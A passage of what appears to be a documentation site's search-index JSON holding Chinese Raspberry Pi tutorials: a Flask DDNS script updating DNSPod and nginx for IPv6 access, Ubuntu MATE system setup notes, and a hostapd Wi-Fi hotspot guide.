%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_10","text":"","title":"\u9644\u5f55"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#flaskpython","text":"","title":"flask\u548cpython\u5b8c\u6574\u4ee3\u7801"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#flask_1","text":"\u6587\u4ef6\u540d\uff1aproxy_and_ddns.py from flask import Flask, request import Ddns application = Flask(__name__) @application.route('/ipv6') def ipv6(): code = request.args['code'] if code != '80': return 'Bad Request' ip = request.remote_addr d = Ddns.Ddns() t = d.update(ip) return t if __name__ == '__main__': application.debug = True application.run()","title":"flask"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#python","text":"\u6587\u4ef6\u540d\uff1aDdns.py import urllib.request import os import re class Ddns(): def update_nginx_config(self, ip): with open('/etc/nginx/sites-available/default', 'r') as f: s = f.read() r = re.compile(r'http://\\[(.*?)\\]; \\# for raspberry pi') s = s.replace(r.findall(s)[0], ip) with open('/etc/nginx/sites-available/default', 'w') as f: f.write(s) os.popen('service nginx restart') def update_dnspod(self, ip): url = 'https://dnsapi.cn/Record.Modify' info = { 'login_email': 'xxx', 'login_password': 'xxx', 'format': 'json', 'domain_id': '23606146', 'record_id': '116841773', 'record_line': '\u9ed8\u8ba4', 'sub_domain': 'test', 'record_type': 'AAAA', 'value': ip } data = urllib.parse.urlencode(info).encode() t = urllib.request.urlopen(url, data=data) return t.read().decode('utf-8') def update(self, ip): t=self.update_dnspod(ip) self.update_nginx_config(ip) return t","title":"python"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%A9%E7%94%A8nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%EF%BC%8C%E6%88%90%E4%B8%BAIPv6_IPv4%E5%85%AC%E7%BD%91%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%88%E9%9C%80%E8%A6%81%E8%BF%9C%E7%A8%8B%E5%8F%8C%E6%A0%88%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%89/#_11","text":"DNSPod\u7528\u6237API\u6587\u6863 \u2014 DNSPod API Doc 1.0.0 documentation \u7528 Python \u811a\u672c\u5b9e\u73b0\u5bf9 Linux \u670d\u52a1\u5668\u7684\u76d1\u63a7 Nginx\u53cd\u5411\u4ee3\u7406\u7684\u914d\u7f6e -- \u7b80\u660e\u73b0\u4ee3\u9b54\u6cd5 \u539f\u6587\u94fe\u63a5\uff1a https://www.polarxiong.com/archives/\u6811\u8393\u6d3e\u5229\u7528nginx\u53cd\u5411\u4ee3\u7406-\u6210\u4e3aIPv6-IPv4\u516c\u7f51\u670d\u52a1\u5668-\u9700\u8981\u8fdc\u7a0b\u53cc\u6808\u670d\u52a1\u5668.html","title":"\u53c2\u8003"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/","text":"\u6811\u8393\u6d3e\u5b89\u88c5Ubuntu mate15.10-\u7cfb\u7edf\u7b14\u8bb0_machh\u7684\u4e13\u680f-CSDN\u535a\u5ba2 \u955c\u50cf\u5730\u5740 https://ubuntu-mate.org/raspberry-pi/ \u8bbe\u7f6eroot\u8d26\u6237 sudo passwd root \u4e4b\u540e\u8f93\u5165\u4e24\u904droot\u7684\u5bc6\u7801 \u7136\u540e sudo passwd--unlock root 1. \u66f4\u6362\u8f6f\u4ef6\u6e90\uff08apt-get sources\uff09 sudo nano /etc/apt/sources.list \u4e2d\u79d1\u5927\u955c\u50cf\u4e3b\u9875\uff1a<https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian> \u6e05\u534e\u955c\u50cf\u4e3b\u9875\uff1a<https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/> sudo nano``/etc/apt/sources``.list \u7f16\u8f91 /etc/apt/sources.list \u6587\u4ef6\u3002 \u5220\u9664\u539f\u6587\u4ef6\u6240\u6709\u5185\u5bb9\uff0c\u7528\u4ee5\u4e0b\u5185\u5bb9\u53d6\u4ee3\uff1a deb <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib deb-src <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib \u7f16\u8f91\u6b64\u6587\u4ef6\u540e\uff0c\u8bf7\u4f7f\u7528 sudo apt-get update \u547d\u4ee4\uff0c\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868\u3002 Ctrl+O\u4fdd\u5b58\u6587\u4ef6 \u3010M+B\u3011\uff0cCtrl+X\u9000\u51fa\u7f16\u8f91\u5668\uff0c \u7136\u540e\u6267\u884c\u547d\u4ee4\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868: sudo apt-get update 2.\u8bbe\u7f6eSSH \u8be6\u7ec6\uff1a ubuntu\u5b89\u88c5 ssh \u5224\u65ad\u662f\u5426\u5b89\u88c5ssh\u670d\u52a1\uff0c\u547d\u4ee4\uff1asshlocalhost \u5982\u679c\u63d0\u793a\uff1a ssh:connecttohostlocalhostport22:Connectionrefused \u5c31\u8868\u793a\u6ca1\u6709\u8fd8\u6ca1\u6709\u5b89\u88c5SSH\uff0c \u5b89\u88c5\u547d\u4ee4\uff1asudoapt-getinstallopenssh-server \u5378\u8f7d\u547d\u4ee4\uff1asudoapt-getremoveopenssh-server \u786e\u8ba4\u662f\u5426\u5b89\u88c5\u6b63\u5e38 ps-e|grepssh 1418?00:00:00sshd \u770b\u5230sshd\u90a3\u8bf4\u660essh-server\u5df2\u7ecf\u542f\u52a8\u4e86 \u5982\u679c\u6ca1\u6709\u5219\u53ef\u4ee5\u8fd9\u6837\u542f\u52a8\uff1asudo/etc/init.d/sshstart\u6216\u8005servicesshstart sudo /etc/init.d/ssh restart\u91cd\u542f ssh-server\u914d\u7f6e\u6587\u4ef6\u4e3a\uff1a/etc/ssh/sshd_config\uff0c\u66f4\u6539\u914d\u7f6e\u9700\u91cd\u542fSSH\u670d\u52a1\u3002 3.\u6269\u5c55\u53ef\u7528\u7a7a\u95f4 \u8f93\u5165sudo fdisk /dev/mmcblk0\u540e\u30100\u96f6 \uff0cl\u5c0f\u5199L\u3011 d \u56de\u8f66 2 \u56de\u8f66 n \u56de\u8f66 p \u56de\u8f66 2\u56de\u8f66 \u7136\u540e\u63d0\u793afirst xxxx \u8fd9\u65f6\u5019\u6309 \u56de\u8f66 \u4e4b\u540e\u63d0\u793aLast xxxxx \u6309\u56de\u8f66 \u6700\u540e\u6309w \u56de\u8f66 sudo reboot \u91cd\u542f\u540e \u518d\u6253\u5f00\u7ec8\u7aef\u8f93\u5165sudo resize2fs /dev/mmcblk0p2 sudo reboot \u8be6\u7ec6 \uff1a \u6269\u5c55\u6811\u8393\u6d3e\u4e2d\u7684SD\u5361\u7a7a\u95f4 4.\u5b89\u88c5VNC 1\u3001sudo apt-get update 2\u3001sudo apt-get install tightvncserver 3\u3001\u5f00\u542f\u670d\u52a1\u5668 tightvncserver \u5907\u6ce8\uff1a\u7b2c\u4e00\u4e2a\u5f00\u542f\u9700\u8981\u914d\u7f6e\u5bc6\u7801 4\u3001VCN\u7684\u7b80\u5355\u63a7\u5236 1) \u505c\u6b62VNC\u7a97\u53e3\uff1avncserver -kill:1 2) \u4fee\u6539\u5bc6\u7801\uff1avncpasswd 3) \u91cd\u542f\u670d\u52a1\u5668\uff1aservice vncserver restart \u8fdc\u7a0b\u684c\u9762\uff08mstsc.exe\uff09\u8fde\u63a5\u6811\u8393\u6d3e sudo``apt-get``install``xrdp 5.\u8bbe\u7f6e\u5206\u8fa8\u7387 \u6811\u8393\u6d3e-\u8bbe\u7f6e\u5c4f\u5e55\u5206\u8fa9\u7387.note \u6811\u8393\u6d3e\u5c4f\u5e55\u65cb\u8f6c\u89d2\u5ea6\u53c2\u6570.note \u6811\u8393\u6d3e \u914d\u7f6e\u6587\u6863 config.txt \u8bf4\u660e .note 6.\u5b89\u88c5samba Ubuntu15.04\u5b89\u88c5samba\u670d\u52a1.note 7\uff0c\u8bbe\u7f6e\u4e2d\u6587 \u6253\u5f00 \u63a7\u5236\u4e2d\u5fc3 \uff08\u5728\u9762\u677f\u7684\u7cfb\u7edf\u91cc\uff09\u70b9\u51fblanguages support \u68c0\u67e5\u8bed\u8a00\u7cfb\u7edf \u70b9\u51fb\u5b89\u88c5 \u91cd\u542f\u5373\u53ef 8.\u5b89\u88c5\u4e2d\u6587\u8f93\u5165\u6cd5 \u8fd9\u91cc\u5b89\u88c5\u7684\u662ffcitx\u7684\u62fc\u97f3\u8f93\u5165\u6cd5\uff1a sudo apt-getinstall fcitx fcitx-sunpinyin sunpinyin\u662f\u57fa\u672c\u7684\u62fc\u97f3\u8f93\u5165\uff0c\u5982\u679c\u9700\u8981\u4e91\u8bcd\u5e93\u62fc\u97f3\uff0c\u4e5f\u5efa\u8bae\u5b89\u88c5google\u62fc\u97f3\u548c\u4e91\u62fc\u97f3 sudo apt-getinstall fcitx-googlepinyin sudo apt-getinstall fcitx-module-cloudpinyin \u53e6\u4e00\u4e2a\u5f00\u6e90\u8f93\u5165\u6cd5RIME\u5728\u6811\u8393\u6d3e\u4e0b\u6548\u679c\u5f88\u597d\uff0c\u57fa\u4e8efcitx\u5b89\u88c5\u4e5f\u5f88\u65b9\u4fbf 1. sudo apt-get install fcitx-rime ubuntu\u5982\u4f55\u5c06\u4e2d\u6587\u8f93\u5165\u6cd5\u5207\u6362\u6210\u82f1\u6587\u8f93\u5165\u6cd5 9.root\u8d26\u6237\u5f00\u542fSSH\u767b\u9646 \u53c2\u8003\u6587\u7ae0 \u6811\u8393\u6d3eraspi2-ubuntu meta\u5b89\u88c5\u914d\u7f6e\u6307\u5bfc \u6811\u8393\u6d3e\u4e0aUbuntu14.04 mate\u8bbe\u7f6e Ubuntu mate \u7cfb\u7edf\u914d\u7f6e > \u6811\u8393\u6d3e\u5427 (baidu) VMware\u4e0aUbuntu\u6587\u4ef6\u5171\u4eab Ubuntu\u4e2d\u6587\u667a\u80fd\u62fc\u97f3\u8f93\u5165\u6cd5\u914d\u7f6e Ubuntu\u4e0bFcitx\u8f93\u5165\u6cd5\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/machh/article/details/51299627","title":"\u6811\u8393\u6d3e\u5b89\u88c5Ubuntu mate15.10 \u7cfb\u7edf\u7b14\u8bb0 machh\u7684\u4e13\u680f CSDN\u535a\u5ba2"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#ubuntu-mate1510-_machh-csdn","text":"\u955c\u50cf\u5730\u5740 https://ubuntu-mate.org/raspberry-pi/ \u8bbe\u7f6eroot\u8d26\u6237 sudo passwd root \u4e4b\u540e\u8f93\u5165\u4e24\u904droot\u7684\u5bc6\u7801 \u7136\u540e sudo passwd--unlock root","title":"\u6811\u8393\u6d3e\u5b89\u88c5Ubuntu mate15.10-\u7cfb\u7edf\u7b14\u8bb0_machh\u7684\u4e13\u680f-CSDN\u535a\u5ba2"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#1-apt-get-sources","text":"sudo nano /etc/apt/sources.list \u4e2d\u79d1\u5927\u955c\u50cf\u4e3b\u9875\uff1a<https://lug.ustc.edu.cn/wiki/mirrors/help/raspbian> \u6e05\u534e\u955c\u50cf\u4e3b\u9875\uff1a<https://mirrors.tuna.tsinghua.edu.cn/raspbian/raspbian/> sudo nano``/etc/apt/sources``.list \u7f16\u8f91 /etc/apt/sources.list \u6587\u4ef6\u3002 \u5220\u9664\u539f\u6587\u4ef6\u6240\u6709\u5185\u5bb9\uff0c\u7528\u4ee5\u4e0b\u5185\u5bb9\u53d6\u4ee3\uff1a deb <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib deb-src <http://mirrors.ustc.edu.cn/raspbian/raspbian>/ wheezy main non-free contrib \u7f16\u8f91\u6b64\u6587\u4ef6\u540e\uff0c\u8bf7\u4f7f\u7528 sudo apt-get update \u547d\u4ee4\uff0c\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868\u3002 Ctrl+O\u4fdd\u5b58\u6587\u4ef6 \u3010M+B\u3011\uff0cCtrl+X\u9000\u51fa\u7f16\u8f91\u5668\uff0c \u7136\u540e\u6267\u884c\u547d\u4ee4\u66f4\u65b0\u8f6f\u4ef6\u5217\u8868: sudo apt-get update","title":"1. \u66f4\u6362\u8f6f\u4ef6\u6e90\uff08apt-get sources\uff09"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#2ssh","text":"\u8be6\u7ec6\uff1a ubuntu\u5b89\u88c5 ssh \u5224\u65ad\u662f\u5426\u5b89\u88c5ssh\u670d\u52a1\uff0c\u547d\u4ee4\uff1asshlocalhost \u5982\u679c\u63d0\u793a\uff1a ssh:connecttohostlocalhostport22:Connectionrefused \u5c31\u8868\u793a\u6ca1\u6709\u8fd8\u6ca1\u6709\u5b89\u88c5SSH\uff0c \u5b89\u88c5\u547d\u4ee4\uff1asudoapt-getinstallopenssh-server \u5378\u8f7d\u547d\u4ee4\uff1asudoapt-getremoveopenssh-server \u786e\u8ba4\u662f\u5426\u5b89\u88c5\u6b63\u5e38 ps-e|grepssh 1418?00:00:00sshd \u770b\u5230sshd\u90a3\u8bf4\u660essh-server\u5df2\u7ecf\u542f\u52a8\u4e86 \u5982\u679c\u6ca1\u6709\u5219\u53ef\u4ee5\u8fd9\u6837\u542f\u52a8\uff1asudo/etc/init.d/sshstart\u6216\u8005servicesshstart sudo /etc/init.d/ssh restart\u91cd\u542f ssh-server\u914d\u7f6e\u6587\u4ef6\u4e3a\uff1a/etc/ssh/sshd_config\uff0c\u66f4\u6539\u914d\u7f6e\u9700\u91cd\u542fSSH\u670d\u52a1\u3002","title":"2.\u8bbe\u7f6eSSH"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#3","text":"\u8f93\u5165sudo fdisk /dev/mmcblk0\u540e\u30100\u96f6 \uff0cl\u5c0f\u5199L\u3011 d \u56de\u8f66 2 \u56de\u8f66 n \u56de\u8f66 p \u56de\u8f66 2\u56de\u8f66 \u7136\u540e\u63d0\u793afirst xxxx \u8fd9\u65f6\u5019\u6309 \u56de\u8f66 \u4e4b\u540e\u63d0\u793aLast xxxxx \u6309\u56de\u8f66 \u6700\u540e\u6309w \u56de\u8f66 sudo reboot \u91cd\u542f\u540e \u518d\u6253\u5f00\u7ec8\u7aef\u8f93\u5165sudo resize2fs /dev/mmcblk0p2 sudo reboot \u8be6\u7ec6 \uff1a \u6269\u5c55\u6811\u8393\u6d3e\u4e2d\u7684SD\u5361\u7a7a\u95f4","title":"3.\u6269\u5c55\u53ef\u7528\u7a7a\u95f4"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#4vnc","text":"1\u3001sudo apt-get update 2\u3001sudo apt-get install tightvncserver 3\u3001\u5f00\u542f\u670d\u52a1\u5668 tightvncserver \u5907\u6ce8\uff1a\u7b2c\u4e00\u4e2a\u5f00\u542f\u9700\u8981\u914d\u7f6e\u5bc6\u7801 4\u3001VCN\u7684\u7b80\u5355\u63a7\u5236 1) \u505c\u6b62VNC\u7a97\u53e3\uff1avncserver -kill:1 2) \u4fee\u6539\u5bc6\u7801\uff1avncpasswd 3) \u91cd\u542f\u670d\u52a1\u5668\uff1aservice vncserver restart \u8fdc\u7a0b\u684c\u9762\uff08mstsc.exe\uff09\u8fde\u63a5\u6811\u8393\u6d3e sudo``apt-get``install``xrdp","title":"4.\u5b89\u88c5VNC"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#5","text":"\u6811\u8393\u6d3e-\u8bbe\u7f6e\u5c4f\u5e55\u5206\u8fa9\u7387.note \u6811\u8393\u6d3e\u5c4f\u5e55\u65cb\u8f6c\u89d2\u5ea6\u53c2\u6570.note \u6811\u8393\u6d3e \u914d\u7f6e\u6587\u6863 config.txt \u8bf4\u660e .note","title":"5.\u8bbe\u7f6e\u5206\u8fa8\u7387"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#6samba","text":"Ubuntu15.04\u5b89\u88c5samba\u670d\u52a1.note","title":"6.\u5b89\u88c5samba"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#7","text":"\u6253\u5f00 \u63a7\u5236\u4e2d\u5fc3 \uff08\u5728\u9762\u677f\u7684\u7cfb\u7edf\u91cc\uff09\u70b9\u51fblanguages support \u68c0\u67e5\u8bed\u8a00\u7cfb\u7edf \u70b9\u51fb\u5b89\u88c5 \u91cd\u542f\u5373\u53ef","title":"7\uff0c\u8bbe\u7f6e\u4e2d\u6587"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#8","text":"\u8fd9\u91cc\u5b89\u88c5\u7684\u662ffcitx\u7684\u62fc\u97f3\u8f93\u5165\u6cd5\uff1a sudo apt-getinstall fcitx fcitx-sunpinyin sunpinyin\u662f\u57fa\u672c\u7684\u62fc\u97f3\u8f93\u5165\uff0c\u5982\u679c\u9700\u8981\u4e91\u8bcd\u5e93\u62fc\u97f3\uff0c\u4e5f\u5efa\u8bae\u5b89\u88c5google\u62fc\u97f3\u548c\u4e91\u62fc\u97f3 sudo apt-getinstall fcitx-googlepinyin sudo apt-getinstall fcitx-module-cloudpinyin \u53e6\u4e00\u4e2a\u5f00\u6e90\u8f93\u5165\u6cd5RIME\u5728\u6811\u8393\u6d3e\u4e0b\u6548\u679c\u5f88\u597d\uff0c\u57fa\u4e8efcitx\u5b89\u88c5\u4e5f\u5f88\u65b9\u4fbf 1. sudo apt-get install fcitx-rime ubuntu\u5982\u4f55\u5c06\u4e2d\u6587\u8f93\u5165\u6cd5\u5207\u6362\u6210\u82f1\u6587\u8f93\u5165\u6cd5","title":"8.\u5b89\u88c5\u4e2d\u6587\u8f93\u5165\u6cd5"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#9rootssh","text":"","title":"9.root\u8d26\u6237\u5f00\u542fSSH\u767b\u9646"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%AE%89%E8%A3%85Ubuntu%20mate15.10-%E7%B3%BB%E7%BB%9F%E7%AC%94%E8%AE%B0_machh%E7%9A%84%E4%B8%93%E6%A0%8F-CSDN%E5%8D%9A%E5%AE%A2/#_1","text":"\u6811\u8393\u6d3eraspi2-ubuntu meta\u5b89\u88c5\u914d\u7f6e\u6307\u5bfc \u6811\u8393\u6d3e\u4e0aUbuntu14.04 mate\u8bbe\u7f6e Ubuntu mate \u7cfb\u7edf\u914d\u7f6e > \u6811\u8393\u6d3e\u5427 (baidu) VMware\u4e0aUbuntu\u6587\u4ef6\u5171\u4eab Ubuntu\u4e2d\u6587\u667a\u80fd\u62fc\u97f3\u8f93\u5165\u6cd5\u914d\u7f6e Ubuntu\u4e0bFcitx\u8f93\u5165\u6cd5\u7684\u5b89\u88c5\u4e0e\u914d\u7f6e \u539f\u6587\u94fe\u63a5\uff1a https://blog.csdn.net/machh/article/details/51299627","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"RPI/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%BC%80%E5%8F%91%E7%B3%BB%E5%88%97%E6%95%99%E7%A8%8B6%E2%80%94%E2%80%94%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9_%E8%80%81%E5%BE%902014-CSDN%E5%8D%9A%E5%AE%A2_%E6%A0%91%E8%8E%93%E6%B4%BE%E5%81%9Awifi%E7%83%AD%E7%82%B9/","text":"\u6811\u8393\u6d3e\u5f00\u53d1\u7cfb\u5217\u6559\u7a0b6\u2014\u2014\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9_\u8001\u5f902014-CSDN\u535a\u5ba2_\u6811\u8393\u6d3e\u505awifi\u70ed\u70b9 \u539f\u7406\uff1aPi\u4f7f\u7528\u6709\u7ebf\u8fde\u5165\u7f51\u7edc\uff0c\u7136\u540e\u63a5USB\u65e0\u7ebf\u7f51\u5361\u4f5c\u4e3a\u70ed\u70b9\uff0c\u63d0\u4f9bWifi\u63a5\u5165\u3002 1\u3001USB\u65e0\u7ebf\u7f51\u5361\u9a71\u52a8 \u5982\u679c\u63a5\u4e0aUSB\u65e0\u7ebf\u7f51\u5361\uff0c\u4f7f\u7528ifconfig\u547d\u4ee4\uff0c\u80fd\u76f4\u63a5\u770b\u5230wlan0\uff0c\u90a3\u4e48\u606d\u559c\u4f60\uff0c\u53ef\u4ee5\u76f4\u63a5\u8df3\u8fc7\u8fd9\u4e00\u6b65\u3002 \u5982\u679c\u6ca1\u6709\u8bf7\u67e5\u8be2\u4e00\u4e0b\u6811\u8393\u6d3e\u652f\u6301\u7684USB\u65e0\u7ebf\u7f51\u5361\u578b\u53f7\uff0c\u53ef\u53c2\u8003\u4ee5\u4e0b\u7f51\u5740\uff1a http://elinux.org/RPi_VerifiedPeripherals#USB_Wi-Fi_Adapters 2\u3001\u4fee\u6539wlan0\u4e3a\u9759\u6001IP *\u76f8\u5f53\u4e8e\u8bbe\u7f6e\u8def\u7531\u5668lan\u53e3IP,\u5373\u6211\u4eec\u8bbf\u95ee\u8def\u7531\u5668\u901a\u5e38\u4f7f\u7528\u7684:192.168.1.1 * sudo vim /etc/network/interfaces \u628a\u539f\u6765\u5173\u4e8ewlan0\u7684\u6ce8\u91ca\u6389\uff1a \uff08\u53ef\u80fd\u8ddf\u8fd9\u4e2a\u4e0d\u4e00\u6837\uff0c\u8ddfwlan0\u6709\u5173\u7684\u6ce8\u91ca\u6389\u5373\u53ef\uff09 auto wlan0 #iface wlan0 inet dhcp #wpa-ssid \"360WiFi-li\" #wpa-psk \"xiaolizi\" \u6dfb\u52a0\u4e0b\u9762\u7684\uff1a iface wlan0 inet static address 192.168.0.1 netmask 255.255.255.0 gateway 192.168.0.1 \u5b8c\u6210\u4e4b\u540e\u9700\u8981\u91cd\u542f 3\u3001\u5b89\u88c5hostapd *\u5b98\u65b9\u7684hostapd\u4e0d\u652f\u63018188CUS\uff0c\u540e\u9762\u9700\u8981\u91cd\u65b0\u5378\u8f7d\u5b89\u88c5\u65b0\u7684 * *\u7b14\u8005\u6d4b\u8bd5\u8c8c\u4f3c\u8fd9\u91cc\u5fc5\u987b\u5148\u88c5\u65e7\u7684\uff0c\u7136\u540e\u540e\u9762\u5378\u4e86\u88c5\u65b0\u7684\uff0c\u5426\u5219\u4e5f\u4e0d\u80fd\u7528 * sudo apt-get install hostapd 1\uff09\u7f16\u8f91hostapd \u9ed8\u8ba4\u914d\u7f6e\u6587\u4ef6\uff1a sudo vim /etc/default/hostapd \u627e\u5230#DAEMON_CONF= \"\"\uff0c\u4fee\u6539\u4e3a\uff1a DAEMON_CONF=\"/etc/hostapd/hostapd.conf\" 2\uff09\u7136\u540e\u7f16\u8f91\uff1asudo vim /etc/hostapd/hostapd.conf \u589e\u52a0\u4ee5\u4e0b\u4ee3\u7801\uff1a # Basic configuration interface=wlan0 ssid=raspberrywifi channel=1 #bridge=br0 # WPA and WPA2 configuration macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=3 wpa_passphrase=12345678 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP # Hardware configuration driver=rtl871xdrv ieee80211n=1 hw_mode=g device_name=RTL8192CU manufacturer=Realtek \u4fee\u6539wifi\u540d\u548c\u5bc6\u7801 ssid=raspberrywifi wpa_passphrase=12345678 3\uff09\u4fdd\u5b58\u9000\u51fa\uff0c\u7136\u540e\u91cd\u542f\u670d\u52a1\uff1a sudo service hostapd restart \u6216\u8005\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\u751f\u6548 sudo hostapd -dd /etc/hostapd/hostapd.conf 4\uff09\u5982\u679c\u4f60\u4f7f\u7528\u7684\u7f51\u5361\u63d0\u793a\u4e00\u4e0b\u4fe1\u606f Configuration file: /etc/hostapd/hostapd.conf nl80211: 'nl80211' generic netlink not found Failed to initialize driver 'nl80211' rmdir[ctrl_interface]: No such file or directory \u90a3\u4e48\uff0c\u8fd8\u662f\u8981\u4f7f\u7528\u7b2c\u4e09\u65b9\u7684hostapd\u3002 4\u3001\u5b89\u88c5\u65b0\u7684hostapd 1)\u5220\u9664\u539f\u6765\u7684hostapd\uff08\u7b14\u8005\u6d4b\u8bd5\uff0c\u4e0d\u5378\u8f7d\u8c8c\u4f3c\u4e5f\u884c\uff09 sudo apt-get autoremove hostapd 2)\u4e0b\u8f7d\u7b2c\u4e09\u65b9\u9a71\u52a8\u5e76\u5b89\u88c5 wget https://github.com/jenssegers/RTL8188-hostapd/archive/v1.1.tar.gz tar -zxvf v1.1.tar.gz 3)\u7f16\u8bd1\uff1a cd RTL8188-hostapd-1.1/hostapd sudo make sudo make install 4)\u7136\u540e\u518d\u91cd\u542f\u670d\u52a1\uff0c\u5e94\u8be5\u63d0\u793a\u6210\u529f\uff1a $ sudo service hostapd restart [ ok ] Stopping advanced IEEE 802.11 management: hostapd. [ ok ] Starting advanced IEEE 802.11 management: hostapd. 5)\u5c06hostapd\u52a0\u5165\u5f00\u673a\u81ea\u542f\u52a8 *sudo service hostapd start * sudo update-rc.d hostapd enable \u7b14\u8005\u8fd9\u91cc\u63d0\u793a\u7684\u8fd8\u662f\u5931\u8d25\uff0c\u4f46\u662f\u91cd\u542f\u540e\u7f51\u7edc\u786e\u5b9e\u5efa\u7acb\u6210\u529f\uff0c\u7528\u624b\u673a\u53ef\u4ee5\u641c\u5230\u8fd9\u4e2a\u7f51\u7edc 